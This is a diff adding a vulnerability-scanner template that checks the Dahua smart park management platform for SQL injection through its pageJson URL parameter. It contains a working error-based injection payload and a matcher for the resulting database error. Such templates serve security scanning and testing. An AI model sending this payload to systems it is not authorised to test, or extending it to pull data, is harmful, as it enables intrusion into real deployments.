@@ -1,0 +1,24 @@
+id: dahua-pageJson-SQL
+
+info:
+  name: 大华智慧园区综合管理平台 pageJson SQL注入
+  author: HuanXiong
+  severity: medium
+  description: |-
+    app="dahua-智慧园区综合管理平台"
+  reference:
+    - 
+  tags: SQL
+
+http:
+  - raw:
+      - |
+        GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers:
+      - type: dsl
+        name: sql注入
+        dsl:
+          - "status_code == 500 && contains (body,'c4ca4238a0b923820dcc509a6f75849')"
